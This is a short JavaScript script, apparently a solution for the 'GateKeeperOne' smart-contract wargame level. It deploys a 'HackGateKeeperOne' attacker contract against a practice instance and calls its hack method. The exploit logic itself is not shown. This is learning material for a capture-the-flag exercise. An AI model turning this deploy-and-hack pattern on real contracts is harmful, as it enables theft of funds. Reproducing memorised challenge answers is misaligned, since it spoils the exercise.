const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load attacker contract.')
    const attacker = loader.web3.fromArtifact('HackGateKeeperOne')

    console.log('Deploy attacker contract...')
    const {
      options: { address }
    } = await attacker.deploy({ arguments: [instance] }).send({ gas: 3000000 })

    console.log('Reload deployed attacker contract')

    console.log('Perform hack...')
    await attacker.methods.hack().send({ gas: 3000000 })

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
